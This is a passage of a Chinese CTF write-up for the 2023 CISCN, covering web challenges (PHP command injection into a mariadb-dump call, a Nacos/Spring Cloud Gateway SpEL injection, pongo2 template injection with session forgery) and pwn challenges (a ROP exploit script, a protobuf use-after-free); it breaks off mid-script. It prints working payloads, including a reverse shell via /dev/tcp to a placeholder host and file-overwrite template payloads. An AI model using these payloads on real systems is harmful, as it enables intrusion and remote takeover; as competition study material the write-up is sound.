class="hljs-variable">$black</span> = <span class="hljs-string">&#x27;;`*#^$&amp;|&#x27;</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$black</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$str</span>,<span class="hljs-variable">$black</span>[<span class="hljs-variable">$i</span>])===<span class="hljs-literal">FALSE</span>))&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>&#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$str</span>,<span class="hljs-string">&#x27;host&#x27;</span>)===<span class="hljs-literal">FALSE</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$str</span>,<span class="hljs-string">&#x27;-h&#x27;</span>)===<span class="hljs-literal">FALSE</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span>;<br>&#125;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&quot;mysql:host=<span class="hljs-subst">$servername</span>;dbname=ctf&quot;</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br>&#125;<br><span class="hljs-keyword">catch</span>(PDOException <span class="hljs-variable">$e</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_query&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_dump&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;use ?db=&amp;table_2_query= or ?db=&amp;table_2_dump= to view the tables! etc:?db=ctf&amp;table_2_query=flag1&#x27;</span>;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;db&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$db</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;db&#x27;</span>];<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no db!&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_query&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$t2q</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_query&#x27;</span>];<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from <span class="hljs-subst">$db</span>.<span class="hljs-subst">$t2q</span>&quot;</span>;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$t2q</span>)))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nop&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$db</span>)))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nop&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br>    <span class="hljs-keyword">try</span>&#123;<br>    <span class="hljs-variable">$stm</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$stm</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$res</span>);<br>    &#125;<br>    <span class="hljs-keyword">catch</span>(PDOException <span class="hljs-variable">$e</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_dump&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$t2d</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_dump&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$t2d</span>)))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nop&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$db</span>)))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nop&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$randstr</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">time</span>());<br>    <span class="hljs-variable">$dump</span>=<span class="hljs-string">&#x27;mariadb-dump &#x27;</span>.<span class="hljs-variable">$db</span>.<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$t2d</span>.<span class="hljs-string">&#x27; &gt;./log/&#x27;</span>.<span class="hljs-variable">$randstr</span>.<span class="hljs-string">&#x27;.log&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$dump</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;dump log here: &lt;a href=\&#x27;&#x27;</span>.<span class="hljs-string">&#x27;./log/&#x27;</span>.<span class="hljs-variable">$randstr</span>.<span class="hljs-string">&#x27;.log&#x27;</span>.<span class="hljs-string">&#x27;\&#x27;&gt;here&lt;/a&gt;&#x27;</span>;<br><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="BackendService"><a href="#BackendService" class="headerlink" title="BackendService"></a>BackendService</h2><p>nacos服务，CVE-2021-29441添加任意用户进后台</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-BackendService-1.png"></p><p>分析<code>backend-1.0-SNAPSHOT.jar</code></p><p>发现内部配置服务有个8888的gateway服务，id为backcfg</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">cloud:</span><br>    <span class="hljs-attr">nacos:</span><br>      <span class="hljs-attr">discovery:</span><br>        <span class="hljs-attr">server-addr:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:8888</span><br>      <span class="hljs-attr">config:</span><br>        <span class="hljs-attr">name:</span> <span class="hljs-string">backcfg</span><br>        <span class="hljs-attr">file-extension:</span> <span class="hljs-string">json</span><br>        <span class="hljs-attr">group:</span> <span class="hljs-string">DEFAULT_GROUP</span><br>        <span class="hljs-attr">server-addr:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:8888</span><br></code></pre></td></tr></table></figure><p>可以通过修改Gateway配置文件反代backendservice服务实现rce</p><p>参考文章：<a href="https://xz.aliyun.com/t/11493#toc">https://xz.aliyun.com/t/11493#toc</a></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-BackendService-2.png"></p><p>反弹shell</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;spring&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;cloud&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;gateway&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;routes&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><br>                    <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;exam&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;order&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;uri&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;lb://backendservice&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;predicates:&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><br>                            <span class="hljs-string">&quot;Path=/evil/**&quot;</span><br>                        <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;filters&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><br>                            <span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;RewritePath&quot;</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                                    <span class="hljs-attr">&quot;replacement&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&#x27;bash&#x27;,&#x27;-c&#x27;,&#x27;bash -i &gt;&amp; /dev/tcp/xxxx/xxxx 0&gt;&amp;1&#x27;&#125;).getInputStream())).replaceAll(&#x27;\n&#x27;,&#x27;&#x27;).replaceAll(&#x27;\r&#x27;,&#x27;&#x27;)&#125;&quot;</span><br>                                <span class="hljs-punctuation">&#125;</span><br>                            <span class="hljs-punctuation">&#125;</span><br>                        <span class="hljs-punctuation">]</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-BackendService-3.png"></p><h2 id="go-session"><a href="#go-session" class="headerlink" title="go_session"></a>go_session</h2><p>源码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> route<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;github.com/flosch/pongo2/v6&quot;</span><br><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br><span class="hljs-string">&quot;github.com/gorilla/sessions&quot;</span><br><span class="hljs-string">&quot;html&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> store = sessions.NewCookieStore([]<span class="hljs-type">byte</span>(os.Getenv(<span class="hljs-string">&quot;SESSION_KEY&quot;</span>)))<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Index</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>session, err := store.Get(c.Request, <span class="hljs-string">&quot;session-name&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-literal">nil</span> &#123;<br>session.Values[<span class="hljs-string">&quot;name&quot;</span>] = <span class="hljs-string">&quot;guest&quot;</span><br>err = session.Save(c.Request, c.Writer)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><br>c.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;Hello, guest&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Admin</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>session, err := store.Get(c.Request, <span class="hljs-string">&quot;session-name&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">&quot;name&quot;</span>] != <span class="hljs-string">&quot;admin&quot;</span> &#123;<br>http.Error(c.Writer, <span class="hljs-string">&quot;N0&quot;</span>, http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br>name := c.DefaultQuery(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;ssti&quot;</span>)<br>xssWaf := html.EscapeString(name)<br>tpl, err := pongo2.FromString(<span class="hljs-string">&quot;Hello &quot;</span> + xssWaf + <span class="hljs-string">&quot;!&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125;<br>out, err := tpl.Execute(pongo2.Context&#123;<span class="hljs-string">&quot;c&quot;</span>: c&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br>c.String(<span class="hljs-number">200</span>, out)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Flask</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>session, err := store.Get(c.Request, <span class="hljs-string">&quot;session-name&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(c.Writer, <span class="hljs-string">&quot;N0&quot;</span>, http.StatusInternalServerError)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br>resp, err := http.Get(<span class="hljs-string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;guest&quot;</span>))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">defer</span> resp.Body.Close()<br>body, _ := io.ReadAll(resp.Body)<br><br>c.String(<span class="hljs-number">200</span>, <span class="hljs-type">string</span>(body))<br>&#125;<br></code></pre></td></tr></table></figure><p>有三个路由</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">r.GET(<span class="hljs-string">&quot;/&quot;</span>, route.Index)<br>r.GET(<span class="hljs-string">&quot;/admin&quot;</span>, route.Admin)<br>r.GET(<span class="hljs-string">&quot;/flask&quot;</span>, route.Flask)<br></code></pre></td></tr></table></figure><p><code>Index</code>路由提供了一个默认的session，name赋值为guest<br><code>Admin</code>路由判断session，需要name值为admin，并使用EscapeString转义name，而且还使用了pongo2渲染，存在ssti漏洞<br><code>Flask</code>路由访问内部5000端口的flask服务并回显页面</p><p>因为<code>SESSION_KEY</code>是从环境变量获取的，猜测为空，进行<code>session</code>伪造<br>本地修改<code>session.Values[&quot;name&quot;] = &quot;admin&quot;</code>，运行拿到伪造的<code>session</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-1.png"></p><p>访问<code>/flask?name=/</code>通过报错拿到<code>flask</code>源码</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-3.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br>app = Flask(__name__)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    name = request.args[<span class="hljs-string">&#x27;name&#x27;</span>]<br>    <span class="hljs-keyword">return</span> name + <span class="hljs-string">&#x27;no ssti&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__== <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;127.0.0.1&quot;</span>,port=<span class="hljs-number">5000</span>,debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>可以看到<code>flask</code>开启了<code>debug</code>模式，<code>debug</code>攻击点一般在<code>算pin</code>或<code>debug热加载</code><br>但是访问<code>/console</code>实现rce需要携带cookie验证，因为我们无法传递cookie，所以利用ssti读文件算pin后rce这条路走不通</p><p>如图，当flask文件的内容被更改后，flask会自动更新，也就是热加载</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-2.png"></p><p>所以我们可以利用ssti实现任意文件读写，然后覆盖server.py，实现自己的恶意内容</p><p>查阅<a href="https://pkg.go.dev/github.com/flosch/pongo2#section-readme">官方手册</a>可知pongo2与Django 1.7有兼容的语法和功能集</p><p>Django中的include语法在pongo2中也能使用，所以可以用include实现任意文件读取<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-6.png"></p><p>写文件可以⽤Gin Context里的FormFile来读取表单⽂件，用SaveUploadFile上传，注意需要用GET传参</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-8.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-7.png"></p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-comment">//读文件</span><br>&#123;%include c.Request.Referer()%&#125;<br>&#123;%include c.Request.Host()%&#125;<br><br><span class="hljs-comment">//写文件</span><br><span class="hljs-comment">//这三个payload其实大同小异，只是后两个使用了过滤器（c.HandlerName的值为 main/route.Admin ）</span><br>&#123;&#123;c.SaveUploadedFile(c.FormFile(c.Request.Host),c.Request.Referer())&#125;&#125;<br>&#123;%set form=c.Query(c.HandlerName|first)%&#125;&#123;&#123;c.SaveUploadedFile(c.FormFile(form),c.Request.Referer())&#125;&#125;&amp;m=file<br>&#123;%set form=c.Query(c.HandlerName|first)%&#125;&#123;%set path=c.Query(c.HandlerName|last)%&#125;&#123;%set file=c.FormFile(form)%&#125;&#123;&#123;c.SaveUploadedFile(file,path)&#125;&#125;&amp;m=file&amp;n=/app/server.py<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-4.png"></p><p>覆盖后就可以执行我们自定义的内容了</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-5.png"></p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="烧烤摊儿"><a href="#烧烤摊儿" class="headerlink" title="烧烤摊儿"></a>烧烤摊儿</h2><p>修改名称存在栈溢出，程序不存在<code>system</code>函数，使用<code>orw</code>获取<code>flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=process(&#x27;./shaokao&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;123.56.251.120&quot;</span>,<span class="hljs-string">&quot;12585&quot;</span>)<br>e=ELF(<span class="hljs-string">&quot;./shaokao&quot;</span>)<br><br>fopen=e.sym[<span class="hljs-string">&#x27;open64&#x27;</span>]<br>read=e.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write=e.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x401fae&#x27;)</span><br>rdi=<span class="hljs-number">0x000000000040264f</span> <span class="hljs-comment">#rdi</span><br>rsi=<span class="hljs-number">0x000000000040a67e</span> <span class="hljs-comment">#rsi</span><br>rdx=<span class="hljs-number">0x00000000004a404b</span> <span class="hljs-comment">#rdx rbx</span><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;-100000&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;flag&#x27;</span>.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload+=p64(rdi)+p64(<span class="hljs-number">0x4e60f0</span>)+p64(rsi)+p64(<span class="hljs-number">0</span>)+p64(fopen)<br>payload+=p64(rdi)+p64(<span class="hljs-number">3</span>)+p64(rsi)+p64(<span class="hljs-number">0x4e60f0</span>)+p64(rdx)+p64(<span class="hljs-number">0x40</span>)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(read)<br>payload+=p64(rdi)+p64(<span class="hljs-number">1</span>)+p64(write)<br>p.sendline(payload)<br></code></pre></td></tr></table></figure><h2 id="StrangeTalkBot"><a href="#StrangeTalkBot" class="headerlink" title="StrangeTalkBot"></a>StrangeTalkBot</h2><p>程序使用了<code>protobuf</code>协议解析输入数据，构造<code>protobuf</code>数据，传入即可<br>程序中存在<code>uaf</code>漏洞与数组越界漏洞，利用<code>gadget</code>构造栈迁移，实现<code>orw</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> varint<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Mode</span>(<span class="hljs-params">m</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x08&#x27;</span>+varint.encode(m&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Ind</span>(<span class="hljs-params">i</span>):<br>    <span 